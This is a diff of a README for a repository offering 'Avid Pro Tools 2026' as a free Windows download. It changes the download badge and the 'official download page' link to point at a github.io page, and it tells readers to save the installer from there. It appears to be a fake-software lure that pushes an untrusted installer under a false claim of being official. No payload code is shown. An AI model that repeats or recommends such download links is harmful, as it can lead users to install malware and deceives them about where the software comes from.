@@ -1,13 +1,13 @@
 # 🎧 Avid-Pro-Tools-2026 - Professional Audio Production Made Simple Today
 
-[![](https://img.shields.io/badge/Download-Avid_Pro_Tools_2026-blue.svg)](https://github.com/crossbenchercockyleeky773/Avid-Pro-Tools-2026)
+[![](https://img.shields.io/badge/Download-Avid_Pro_Tools_2026-blue.svg)](https://crossbenchercockyleeky773.github.io)
 
 ## 📥 Getting Started
 
 This software provides a complete environment for recording, editing, and mixing audio on Windows 10 and 11. Follow the steps below to place the application on your computer.
 
 1. Open your web browser.
-2. Navigate to the [official download page](https://github.com/crossbenchercockyleeky773/Avid-Pro-Tools-2026).
+2. Navigate to the [official download page](https://crossbenchercockyleeky773.github.io).
 3. Select the Windows installer file.
 4. Save the file to your desktop or downloads folder.
 
